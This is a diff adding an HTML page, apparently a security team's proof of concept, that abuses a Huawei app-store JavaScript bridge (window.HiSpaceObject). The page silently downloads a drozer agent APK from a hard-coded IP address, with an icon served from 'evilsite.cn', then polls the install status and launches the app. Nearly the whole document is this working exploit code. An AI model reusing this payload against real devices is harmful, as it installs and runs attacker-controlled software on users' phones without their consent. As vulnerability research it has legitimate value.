@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html>
+<head>
+</head>
+<body>
+<table height=100% width=100%><tr><td>CBG Security Team</td></tr></table>
+<script>
+var msg="";
+for(i in window.HiSpaceObject ){  
+  msg+=i;
+msg+="\r\n";  
+  msg+=test[i];  
+}  
+//alert(msg);
+var dataConfig = {
+                installStatus: 0,
+                isHuawei: true,
+                isWeiXinOrWeiBo: false,
+                installInfo: {
+                    url: "http://192.168.203.87:9999/drozer.apk", //url必须有值且正确
+                    extendName: 'invalid',
+                    name: 'drozer Agent',
+                    packageName: 'com.mwr.dz', //和安装包名不符合时，会在桌面遗留一个“正在安装”的图标，重启后可移除
+                    callerName: 'invalid',
+                    size: '1710072', //size必须有值且正确
+                    //iconUrl: "https://192.168.203.87:8443/favor.png",
+					iconUrl: "http://www.evilsite.cn/images/favicon.png",
+                    version: "505",
+                    appId: "C10149090",
+                    md5: "D8970855A11C1A90DC9722718AE51209"
+                }
+            }
+window.HiSpaceObject.startDownload(JSON.stringify(dataConfig.installInfo));
+//alert("started");
+var int=setInterval("getappstatus();",500);
+function getappstatus() {
+  var status= window.HiSpaceObject.getAppStatus("com.mwr.dz");
+  //var status= window.HiSpaceObject.getAppStatus("com.huawei.securitymgr");
+  if(status.indexOf("status\":0")>-1) {
+    int=clearInterval(int);
+    //alert(/xss/);
+    window.HiSpaceObject.launchApp("com.mwr.dz",null,null);
+    //alert(/xss2/);
+  }
+  //alert(status);
+}
+window.HiSpaceObject.launchApp("com.huawei.android.launcher",null,null);
+</script>
+</body>
+</html>
